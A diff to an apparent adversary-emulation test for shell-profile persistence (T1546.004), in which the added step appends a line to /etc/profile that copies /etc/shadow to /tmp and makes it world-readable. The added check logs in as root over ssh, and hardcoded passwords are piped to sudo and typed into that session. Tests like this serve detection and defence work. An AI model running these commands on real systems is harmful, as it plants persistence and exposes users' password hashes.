@@ -1,9 +1,20 @@
 Elevation Required;
+#pre
+echo "010404grz" | sudo -S sh -c '((which yum && sudo yum -y install tmux) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y tmux))'
 #command
-echo '# attack test T1546.004' >> /etc/profile
+echo 'cp /etc/shadow /tmp/shadow ; chmod 777 /tmp/shadow' >> /etc/profile
 #check
-echo "/etc/profile:"
-cat /etc/profile | tail -n 5
-if [ "$(cat /etc/profile | tail -n 1)" = "# attack test T1546.004" ]; then echo "Append to the system shell profile success"; else echo "No such file or directory"; fi;
+tmux new-session -d -s my_session "ssh -o StrictHostKeyChecking=no root@localhost"
+sleep 1
+tmux send-keys -t my_session:0 "010404" Enter
+sleep 1
+echo "在/etc/profile中添加恶意命令（cp /etc/shadow /tmp/shadow ; chmod 777 /tmp/shadow）以建立持久性，每当有高权限用户登录系统时："
+tmux capture-pane -t my_session:0
+tmux show-buffer | sed '/^$/d'
+echo "都会执行这个命令，检查/tmp/shadow："
+ls -al /tmp/shadow
+cat /tmp/shadow | head -n 3
 #cleanup
-sed -i "\,# attack test T1546.004,d" /etc/profile
+sed -i "\,cp /etc/shadow /tmp/shadow ; chmod 777 /tmp/shadow,d" /etc/profile
+rm -f /tmp/shadow
+tmux kill-session -t my_session
